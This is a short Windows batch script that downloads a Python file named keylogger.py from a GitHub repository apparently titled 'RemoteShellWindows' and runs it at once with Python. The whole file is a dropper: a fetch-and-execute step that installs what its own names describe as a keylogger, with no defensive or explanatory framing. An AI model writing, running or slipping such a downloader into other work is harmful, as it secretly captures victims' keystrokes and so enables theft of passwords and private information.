@echo off
REM Set the URL of the Python file
set URL=https://raw.githubusercontent.com/Lord-Of-Legends/RemoteShellWindows/main/keylogger.py
REM Set the local file name to save the Python file as
set FILENAME=keylogger.py

REM Use curl to download the Python file
curl -o %FILENAME% %URL%

REM Check if the download was successful
if exist %FILENAME% (
    echo File downloaded successfully.
    
    REM Run the Python file
    python %FILENAME%
) else (
    echo Failed to download the file.
)

pause
